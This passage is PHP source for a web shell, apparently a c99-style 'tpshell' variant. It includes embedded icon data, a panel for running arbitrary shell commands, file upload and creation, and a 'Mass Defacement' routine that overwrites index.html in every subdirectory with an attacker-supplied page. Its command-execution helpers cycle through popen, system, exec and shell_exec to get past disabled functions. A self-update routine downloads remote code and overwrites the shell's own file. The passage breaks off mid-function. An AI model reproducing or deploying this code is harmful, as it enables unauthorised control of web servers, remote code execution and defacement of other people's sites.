"zP+Z///MAP/MM//MZv/Mmf/MzP/M////AP//M///Zv//mf//zP///yH5BAEAABAALAAAAAANAAwA".
"AAgzAFEIHEiwoMGDCBH6W0gtoUB//1BENOiP2sKECzNeNIiqY0d/FBf+y0jR48eQGUc6JBgQADs=",
"up"=>
"R0lGODlhFAAUALMAAAAAAP////j4+OPj493d3czMzLKysoaGhk1NTf///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJq734ns1PnkcgjgXwhcNQrIVhmFonzxwQjnie27jg".
"+4Qgy3XgBX4IoHDlMhRvggFiGiSwWs5XyDftWplEJ+9HQCyx2c1YEDRfwwfxtop4p53PwLKOjvvV".
"IXtdgwgdPGdYfng1IVeJaTIAkpOUlZYfHxEAOw==",
"write"=>
"R0lGODlhFAAUALMAAAAAAP///93d3czMzLKysoaGhmZmZl9fXwQEBP///wAAAAAAAAAAAAAAAAAA".
"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze".
"EQYQLUAsGgM0Wwt3bCJfQSFx10yyBlJn8RfEMgM9X+3qHWq5iED5yCsMCl111knDpuXfYls+IK61".
"LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",
"ext_asp"=>
"R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".
"/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI".
"D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=",
"ext_mp3"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
"ext_avi"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM".
"WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4".
"PYXCyg+V2i44XeRmSfYqsGhAAgA7",
"ext_cgi"=>
"R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9".
"DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6".
"LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S".
"Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ".
"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UM".
"BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD".
"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi".
"RYtMAgEAOw==",
"ext_cmd"=>
"R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".
"eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".
"dmrYAMn1onq/YKpjvEgAADs=",
"ext_cpp"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC".
"WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra".
"Eq7YrLDE7a4SADs=",
"ext_ini"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL".
"aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM".
"SnEjgPVarHEHgrB43JvszsQEADs=",
"ext_diz"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs".
"/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv".
"/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3".
"/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr".
"/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX".
"pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA".
"dAAAdzZEaE9wwDZYpmVviR49jG12kChFmgYuj6+1xeLn7Nzj6pm20oeqypS212SJraCyxZWyz7PW".
"9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK".
"4rfW+NXe6Oby/5SvzWSHr+br8WuKrQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm".
"C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg".
"2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF".
"CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA".
"Ow==",
"ext_doc"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR".
"WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq".
"MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=",
"ext_exe"=>
"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
"xhIAOw==",
"ext_h"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB".
"WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo".
"Wq/NknbbSgAAOw==",
"ext_hpp"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF".
"WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR".
"UqUagnbLdZa+YFcCADs=",
"ext_htaccess"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6".
"WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ".
"AAA7",
"ext_html"=>
"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
"ADs=",
"ext_jpg"=>
"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
"FxEAOw==",
"ext_js"=>
"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
"a00AjYYBbc/o9HjNniUAADs=",
"ext_lnk"=>
"R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO".
"NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi".
"Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk".
"AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG".
"MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5".
"NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf".
"1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ".
"ADs=",
"ext_log"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN".
"zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==",
"ext_php"=>
"R0lGODlhEAAQAIABAAAAAP///ywAAAAAEAAQAAACJkQeoMua1tBxqLH37HU6arxZYLdIZMmd0Oqp".
"aGeyYpqJlRG/rlwAADs=",
"ext_pl"=>
"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".
"GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",
"ext_swf"=>
"R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".
"nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".
"GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".
"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",
"ext_tar"=>
"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".
"Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".
"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".
"UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p".
"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg".
"GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".
"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
"u4tLAgEAOw==",
"ext_txt"=>
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7",
"ext_wri"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"ext_xml"=>
"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
"IQA7"
);
//Untuk optimalisasi ukuran dan kecepatan.
$imgequals = array(
  "ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
  "ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
  "ext_jpg"=>array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
  "ext_html"=>array("ext_html","ext_htm"),
  "ext_avi"=>array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
  "ext_lnk"=>array("ext_lnk","ext_url"),
  "ext_ini"=>array("ext_ini","ext_css","ext_inf"),
  "ext_doc"=>array("ext_doc","ext_dot"),
  "ext_js"=>array("ext_js","ext_vbs"),
  "ext_cmd"=>array("ext_cmd","ext_bat","ext_pif"),
  "ext_wri"=>array("ext_wri","ext_rtf"),
  "ext_swf"=>array("ext_swf","ext_fla"),
  "ext_mp3"=>array("ext_mp3","ext_au","ext_midi","ext_mid"),
  "ext_htaccess"=>array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
);
if (!$getall) {
  header("Content-type: image/gif");
  header("Cache-control: public");
  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  header("Cache-control: max-age=".(60*60*24*7));
  header("Last-Modified: ".date("r",filemtime(__FILE__)));
  foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}
  if (empty($images[$img])) {$img = "small_unk";}
  if (in_array($img,$ext_tar)) {$img = "ext_tar";}
  echo base64_decode($images[$img]);
}
else {
  foreach($imgequals as $a=>$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]<br>");}}}}
  natsort($images);
  $k = array_keys($images);
  echo  "<center>";
  foreach ($k as $u) {echo $u.":<img src=\"".$surl."act=img&img=".$u."\" border=\"1\"><br>";}
  echo "</center>";
}
exit;
}

echo "</td></tr></table>\n";
/*** COMMANDS PANEL ***/
?>

<table class=mainpanel>
<tr><td align=right>Command:</td>
<td><form method="POST">
    <input type=hidden name=act value="cmd">
    <input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type="text" name="cmd" size="100" value="<?php echo htmlspecialchars($cmd); ?>">
    <input type=hidden name="cmd_txt" value="1"> <input type=submit name=submit value="Execute">
    </form>
</td></tr>
<tr><td align=right>Quick Commands:</td>
<td><form method="POST">
    <input type=hidden name=act value="cmd">
    <input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type=hidden name="cmd_txt" value="1">
    <select name="cmd">
    <?php
    foreach ($cmdaliases as $als) {
      echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";
    }
    foreach ($cmdaliases2 as $als) {
      echo "<option value=\"".htmlspecialchars($als[1])."\">".htmlspecialchars($als[0])."</option>";
    }
    ?>
    </select> <input type=submit name=submit value="Execute">
    </form>
</td></tr>
<tr><td align=right>Upload:</td>
<td><form method="POST" enctype="multipart/form-data">
    <input type=hidden name=act value="upload">
    <input type=hidden name="miniform" value="1">
    <input type="file" name="uploadfile"> <input type=submit name=submit value="Upload"> <?php echo $wdt." Max size: ". @ini_get("upload_max_filesize")."B"; ?>
    </form>
</td></tr>
<tr><td align=right>PHP Filesystem:</td>
<td>
<?php ##[ Acid ]## ?>
<script language="javascript">
function set_arg(txt1,txt2) {
  document.forms.fphpfsys.phpfsysfunc.value.selected = "Download";
  document.forms.fphpfsys.arg1.value = txt1;
  document.forms.fphpfsys.arg2.value = txt2;
}
function chg_arg(num,txt1,txt2) {
  if (num==0) {
    document.forms.fphpfsys.arg1.type = "hidden";
    document.forms.fphpfsys.A1.type = "hidden";
  }
  if (num<=1) {
    document.forms.fphpfsys.arg2.type = "hidden";
    document.forms.fphpfsys.A2.type = "hidden";
  }
  if (num==2) {
    document.forms.fphpfsys.A1.type = "label";
    document.forms.fphpfsys.A2.type = "label";
    document.forms.fphpfsys.arg1.type = "text";
    document.forms.fphpfsys.arg2.type = "text";
  }
  document.forms.fphpfsys.A1.value = txt1 + ":";
  document.forms.fphpfsys.A2.value = txt2 + ":";
}
</script>
<?php
  echo "<form name=\"fphpfsys\" method=\"POST\"><input type=hidden name=act value=\"phpfsys\"><input type=hidden name=d value=\"$dispd\">\r\n".
       "<select name=\"phpfsysfunc\">\r\n";
  foreach ($phpfsaliases as $als) {
    if ($als[1]==$phpfsysfunc) {
      echo "<option selected value=\"".$als[1]."\" onclick=\"chg_arg('$als[2]','$als[3]','$als[4]')\">".$als[0]."</option>\r\n";
    }
    else {
      echo "<option value=\"".$als[1]."\" onclick=\"chg_arg('$als[2]','$als[3]','$als[4]')\">".$als[0]."</option>\r\n";
    }
  }
  echo "</select>\r\n".
       "<input type=label name=A1 value=\"File:\" size=2 disabled> <input type=text name=arg1 size=40 value=\"".htmlspecialchars($arg1)."\">\r\n".
       "<input type=hidden name=A2 size=2 disabled> <input type=hidden name=arg2 size=50 value=\"".htmlspecialchars($arg2)."\">\r\n".
       "<input type=submit name=submit value=\"Execute\"><hr noshade size=1>\r\n";
  foreach ($sh_sourcez as $e => $o) {
    echo "<input type=button value=\"$e\" onclick=\"set_arg('$o[0]','$o[1]')\">\r\n";
  }
  echo "</form>\r\n";
?>
</td></tr>
<tr><td align=right>Search File:</td>
<td><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type="text" name="search_name" size="29" value="(.*)"> <input type="checkbox" name="search_name_regexp" value="1" checked> regexp <input type=submit name=submit value="Search">
    </form>
    </td></tr>
<tr><td align=right>Create File:</td>
<td><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="<?php echo $dispd; ?>"><input type=hidden name="ft" value="edit">
    <input type="text" name="mkfile" size="70" value="<?php echo $dispd; ?>"> <input type="checkbox" name="overwrite" value="1" checked> Overwrite <input type=submit value="Create"> <?php echo $wdt; ?>
    </form></td></tr>
<tr><td align=right>View File:</td>
<td><form method="POST"><input type=hidden name=act value="gofile"><input type=hidden name="d" value="<?php echo $dispd; ?>">
    <input type="text" name="f" size="70" value="<?php echo $dispd; ?>"> <input type=submit value="View">
    </form></td></tr>
<?
$self=basename($_SERVER['PHP_SELF']);
if(isset($_POST['execmassdeface']))
{
echo "<center><textarea rows='10' cols='100'>";
$hackfile = $_POST['massdefaceurl'];
$dir = $_POST['massdefacedir'];
echo $dir."\n";

if (is_dir($dir)) {
    if ($dh = opendir($dir)) {
        while (($file = readdir($dh)) !== false) {
			if(filetype($dir.$file)=="dir"){
				$newfile=$dir.$file."/index.html";
				echo $newfile."\n";
				if (!copy($hackfile, $newfile)) {
					echo "failed to copy $file...\n";
				}
			}
        }
        closedir($dh);
    }
}
echo "</textarea></center>";} ?>


<tr><td align=right>Mass Defacement:</td>
<td><form action='<? basename($_SERVER['PHP_SELF']); ?>' method='post'>[+] Main Directory: <input type='text' style='width: 250px' value='<?php echo $dispd; ?>' name='massdefacedir'> [+] Defacement Url: <input type='text' style='width: 250px' name='massdefaceurl'><input type='submit' name='execmassdeface' value='Execute'></form></td>


</table>
<?php footer(); ?>
</body></html>
<?php


function safemode() {
  if ( @ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) { return TRUE; }
  else { return FALSE; }
}
function getdisfunc() {
  $disfunc = @ini_get("disable_functions");
  if (!empty($disfunc)) {
    $disfunc = str_replace(" ","",$disfunc);
    $disfunc = explode(",",$disfunc);
  }
  else { $disfunc= array(); }
  return $disfunc;
}
function enabled($func) {
 if ( is_callable($func) && !in_array($func,getdisfunc()) ) { return TRUE; }
 else { return FALSE; }
}
function tpexec($cmd) {
  $output = "";
  if ( enabled("popen") ) {
    $h = popen($cmd.' 2>&1', 'r');
    if ( is_resource($h) ) {
      while ( !feof($h) ) { $output .= fread($h, 2096);  }
      pclose($h);
    }
  }
  elseif ( enabled("passthru") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("system") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); }
  elseif ( enabled("shell_exec") ) { $output = shell_exec($cmd); }
  return $output;
}
function tpexec2($cmd) {
  $output = "";
  if ( enabled("system") ) { @ob_start(); system($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("exec") ) { exec($cmd,$o); $output = join("\r\n",$o); }
  elseif ( enabled("shell_exec") ) { $output = shell_exec($cmd); }
  elseif ( enabled("passthru") ) { @ob_start(); passthru($cmd); $output = @ob_get_contents(); @ob_end_clean(); }
  elseif ( enabled("popen") ) {
    $h = popen($cmd.' 2>&1', 'r');
    if ( is_resource($h) ) {
      while ( !feof($h) ) { $output .= fread($h, 2096);  }
      pclose($h);
    }
  }
  return $output;
}
function which($pr) {
  $path = tpexec("which $pr");
  if(!empty($path)) { return $path; } else { return $pr; }
}

function get_status() {
  function showstat($sup,$stat) {
    if ($stat=="on") { return "$sup: <font color=orange><b>ON</b></font>"; }
    else { return "$sup: <font color=orange><b>OFF</b></font>"; }
  }
  $arrfunc = array(
    array("MySQL","mysql_connect"),
    array("MSSQL","mssql_connect"),
    array("Oracle","ocilogon"),
    array("PostgreSQL","pg_connect"),
    array("Curl","curl_version"),
  );
  $arrcmd = array(
    array("Fetch","fetch --help"),
    array("Wget","wget --help"),
    array("Perl","perl -v"),
  );

  $statinfo = array();
  foreach ($arrfunc as $func) {
    if (function_exists($func[1])) { $statinfo[] = showstat($func[0],"on"); }
    else { $statinfo[] = showstat($func[0],"off"); }
  }
  $statinfo[] = (@extension_loaded('sockets'))?showstat("Sockets","on"):showstat("Sockets","off");
  foreach ($arrcmd as $cmd) {
    if (tpexec2($cmd[1])) { $statinfo[] = showstat($cmd[0],"on"); }
    else { $statinfo[] = showstat($cmd[0],"off"); }
  }
  return implode(" ",$statinfo);
}
function showdisfunc() {
  if ($disablefunc = @ini_get("disable_functions")) {
    return "<font color=orange><b>".$disablefunc."</b></font>";
  }
  else { return "<font color=orange><b>NONE</b></b></font>"; }
}
function disp_drives($curdir,$surl) {
  $letters = "";
  $v = explode("\\",$curdir);
  $v = $v[0];
  foreach (range("A","Z") as $letter) {
    $bool = $isdiskette = $letter == "A";
    if (!$bool) { $bool = is_dir($letter.":\\"); }
    if ($bool) {
      $letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".
                  ($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly!')\"":"")."> ";
      if ($letter.":" != $v) { $letters .= $letter; }
      else { $letters .= "<font color=orange>".$letter."</font>"; }
      $letters .= "</a> ";
    }
  }
  if (!empty($letters)) { Return $letters; }
  else  {Return "None"; }
}
function disp_freespace($curdrv) {
  $free = @disk_free_space($curdrv);
  $total = @disk_total_space($curdrv);
  if ($free === FALSE) { $free = 0; }
  if ($total === FALSE) { $total = 0; }
  if ($free < 0) { $free = 0; }
  if ($total < 0) { $total = 0; }
  $used = $total-$free;
  $free_percent = round(100/($total/$free),2)."%";
  $free = view_size($free);
  $total = view_size($total);
  return "$free of $total ($free_percent)";
}

function tpgetsource($fn) {
  global $tpsh_sourcesurl;
  $array = array(
    "tpsh.php" => "tpsh.txt",
  );
  $name = $array[$fn];
  if ($name) {return file_get_contents($tpsh_sourcesurl.$name);}
  else {return FALSE;}
}
function tpsh_getupdate($update = TRUE) {
  $url = $GLOBALS["tpsh_updateurl"]."?version=".urlencode(base64_encode($GLOBALS["sh_ver"]))."&updatenow=".($updatenow?"1":"0");
  $data = @file_get_contents($url);
  if (!$data) { return "Can't connect to update-server!"; }
  else {
    $data = ltrim($data);
    $string = substr($data,3,ord($data{2}));
    if ($data{0} == "\x99" and $data{1} == "\x01") {return "Error: ".$string; return FALSE;}
    if ($data{0} == "\x99" and $data{1} == "\x02") {return "You are using latest version!";}
    if ($data{0} == "\x99" and $data{1} == "\x03") {
      $string = explode("|",$string);
      if ($update) {
        $confvars = array();
        $sourceurl = $string[0];
        $source = file_get_contents($sourceurl);
        if (!$source) {return "Can't fetch update!";}
        else {
          $fp = fopen(__FILE__,"w");
          if (!$fp) {return "Local error: can't write update to ".__FILE__."! You may download tpshell.php manually <a href=\"".$sourceurl."\"><u>here</u></a>.";}
          else {
            fwrite($fp,$source);
            fclose($fp);
            return "Update completed!";
          }
        }
